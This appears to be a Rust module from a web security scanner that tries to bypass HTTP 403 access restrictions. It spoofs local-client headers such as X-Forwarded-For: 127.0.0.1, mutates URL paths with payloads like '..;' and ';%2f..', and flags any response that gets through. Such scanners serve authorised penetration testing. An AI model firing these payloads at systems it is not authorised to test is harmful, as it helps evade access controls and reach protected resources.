use std::{str::FromStr, sync::Arc, vec};

use hyper::{body::Bytes, header::HOST, http::HeaderValue, HeaderMap, Method, StatusCode, Uri};
use log::error;
use once_cell::sync::Lazy;
use strsim::normalized_levenshtein;

use crate::{
    librs::http::utils::HttpRequest,
    modules::{IActive, Issue, IssueConfidence, IssueLevel, ModuleMeta, ModuleType},
    st_error,
    utils::STError,
};

pub struct UnauthBypass {
    meta: Option<ModuleMeta>,
}

static HEADER_PAYLOADS: Lazy<Vec<(&str, &str)>> = Lazy::new(|| {vec![
        ("Client-IP", "127.0.0.1"),
        ("X-Real-Ip", "127.0.0.1"),
        ("Redirect", "127.0.0.1"),
        ("Referer", "127.0.0.1"),
        ("X-Client-IP", "127.0.0.1"),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Forwarded-By", "127.0.0.1"),
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Forwarded-Host", "127.0.0.1"),
        ("X-Forwarded-Port", "80"),
        ("X-True-IP", "127.0.0.1"),
    ]
});


fn run(
    method: Method,
    url: &str,
    headers: &HeaderMap,
    body: Arc<Bytes>,
) -> Result<Vec<crate::modules::Issue>, crate::utils::STError> {
    let payloads = vec![
        "%09", "%20", "%23", "%2e", "%2f", ".", ";", "..;", ";%09", ";%09..", ";%09..;", ";%2f..",
        "*",
    ];

    
    let uri = match Uri::from_str(url) {
        Ok(u) => u,
        Err(e) => {
            let msg = format!("{}", e);
            return Err(STError::new(&msg));
        }
    };
    let host_with_port = Arc::new(match uri.port() {
        Some(s) => format!("{}:{}", uri.host().unwrap(), uri.port_u16().unwrap()),
        None => {
            format!("{}", uri.host().unwrap())
        }
    });
    let not_found = match HttpRequest::from_url(&format!("{}sdfdsfsdfgdf", url)) {
        Ok(o) => o,
        Err(e) => {
            return Err(e);
        }
    };
    let resp = match HttpRequest::send(method.clone(), &not_found) {
        Ok(o) => o,
        Err(e) => {
            return Err(e);
        }
    };
    let not_found = Arc::new(String::from_utf8_lossy(&resp.get_body()).to_string());
    let rt = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    let nodes = uri.path().split("/").collect::<Vec<&str>>();
    let mut i = 0;
    let mut handles = vec![];
    for node in &nodes {
        let var_node = node.to_string();
        for payload in &payloads {
            let out = format!("{}/{}", var_node, payload);
            let mut _nodes = vec![];
            for n in &nodes {
                _nodes.push(n.to_string());
            }
            _nodes[i] = out;
            let payload_path = _nodes.join("/");
            let target_u = match uri.port() {
                Some(o) => {
                    let h = match uri.host() {
                        Some(s) => s,
                        None => {
                            let m = format!("error host {}", url);
                            return Err(STError::new(&m));
                        }
                    };
                    format!(
                        "{}://{}:{}{}?{}",
                        uri.scheme_str().unwrap(),
                        h,
                        o,
                        payload_path,
                        uri.query().unwrap_or("")
                    )
                }
                None => {
                    let h = match uri.host() {
                        Some(s) => s,
                        None => {
                            let m = format!("error host {}", url);
                            return Err(STError::new(&m));
                        }
                    };
                    format!(
                        "{}://{}{}?{}",
                        uri.scheme_str().unwrap(),
                        h,
                        payload_path,
                        uri.query().unwrap_or("")
                    )
                }
            };

            
            for header in HEADER_PAYLOADS.iter() {
                let mut request = match HttpRequest::from_url(&target_u) {
                    Ok(o) => o,
                    Err(e) => {
                        return Err(e);
                    }
                };
                request.set_headers(headers);
                request.set_body(body.clone());
                let m = method.clone();
                let not_found2 = not_found.clone();
                let h_port = host_with_port.clone();
                let mut r = request.clone();
                let handle = rt.spawn(async move {
                    r.set_header(header.0, header.1);
                    let resp = match HttpRequest::send_async(m, &r).await {
                        Ok(o) => o,
                        Err(e) => {
                            error!("{}", e);
                            return;
                        }
                    };
    
                    if resp.get_status().eq(&StatusCode::FORBIDDEN)
                        || resp.get_status().eq(&StatusCode::NOT_FOUND)
                    {
                        return;
                    }
                    let content = String::from_utf8_lossy(&resp.get_body()).to_string();
                    if normalized_levenshtein(&content, &not_found2) > 0.9 {
                        return;
                    }
    
                    let issue = Issue::new(
                        "unauth_bypass",
                        IssueLevel::HighRisk,
                        "",
                        IssueConfidence::Confirm,
                        &h_port,
                    );
    
                    Issue::add_issue(issue, &Arc::new(resp.get_httplog()))
                });
                handles.push(handle);
                request.remove_header(header.0);
            }
            
        }
        i += 1
    }

    rt.block_on(async move {
        for h in handles {
            let s = match h.await {
                Ok(o) => o,
                Err(e) => {
                    continue;
                }
            };
        }
    });

    Ok(vec![])
}

impl IActive for UnauthBypass {
    fn passive_run(&self, index: u32) -> Result<Vec<crate::modules::Issue>, crate::utils::STError> {
        let result = Vec::default();
        //println!("passive_run...");
        return Ok(result);
    }

    fn active_run(
        &self,
        url: &str,
        args: crate::modules::Args,
    ) -> Result<Vec<crate::modules::Issue>, crate::utils::STError> {
        let result = Vec::default();
        let uri = match Uri::from_str(url) {
            Ok(o) => o,
            Err(e) => {
                return Err(st_error!(e));
            }
        };
        let host_with_port = match uri.port() {
            Some(port) => {
                format!("{}:{}", uri.host().unwrap(), port)
            }
            None => {
                format!("{}", uri.host().unwrap())
            }
        };
        let mut headers = HeaderMap::new();
        let host_key = HeaderValue::from_str("host").unwrap();
        headers.insert(HOST, host_with_port.parse().unwrap());
        let s = run(Method::GET, url, &headers, Arc::new(Bytes::from("")));
        return Ok(result);
    }

    fn metadata(&self) -> &Option<crate::modules::ModuleMeta> {
        &self.meta
    }

    fn is_change(&self) -> bool {
        false
    }

    fn update(&mut self) -> Result<(), crate::utils::STError> {
        Ok(())
    }
}

impl UnauthBypass {
    pub fn new() -> Self {
        let meta = ModuleMeta {
            name: "unauth_bypass".to_string(),
            description: "403 bypasser".to_string(),
            m_type: ModuleType::RustModule,
        };
        Self { meta: Some(meta) }
    }
}
